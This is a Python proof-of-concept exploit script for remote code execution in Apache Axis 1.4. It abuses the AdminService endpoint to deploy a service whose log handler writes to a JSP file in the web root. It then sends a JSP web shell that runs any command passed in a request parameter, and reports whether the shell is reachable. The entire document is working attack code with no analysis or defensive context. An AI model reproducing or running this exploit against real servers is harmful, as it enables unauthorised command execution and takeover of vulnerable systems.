import  requests
import sys

def doit(url):
    shell='''<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <ns1:deployment
  xmlns="http://xml.apache.org/axis/wsdd/"
  xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
  xmlns:ns1="http://xml.apache.org/axis/wsdd/">
  <ns1:service name="RandomService" provider="java:RPC">
    <requestFlow>
      <handler type="RandomLog"/>
    </requestFlow>
    <ns1:parameter name="className" value="java.util.Random"/>
    <ns1:parameter name="allowedMethods" value="*"/>
  </ns1:service>
  <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >  
    <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" />   
    <parameter name="LogHandler.writeToConsole" value="false" /> 
  </handler>
</ns1:deployment>
  </soapenv:Body>
</soapenv:Envelope>'''
    write='''<?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:main
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <api:in0><![CDATA[
<%@page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>
]]>
            </api:in0>
        </api:main>
  </soapenv:Body>
</soapenv:Envelope>'''
    d=requests.post(url+"/services/AdminService",verify=False,headers={"Content-Type":"application/xml","SOAPAction":"somethi"},data=shell)
    if 'processing</Admin>' in d.content:
        print "deplay service finised!"
    else:
        print "may be not vulnerable!!"
    requests.post(url+"/services/RandomService", verify=False,
                  headers={"Content-Type": "application/xml", "SOAPAction": "somethi"}, data=write)

    ret=requests.get(url+"../shell.jsp",verify=False)
    if ret.status_code==200:
        print "you got shell: "+url+"../shell.jsp"
    else:
        print "try it yourself !!"
if  __name__ == "__main__":
    if len(sys.argv)<>2:
        print "Axis1.4_rce_poc.py axisurl\r\n eg:Axis1.4_rce_poc.py http://localhost:8080/axis/"
    else:
        try:
            doit(sys.argv[1])
        except Exception,e:
            print e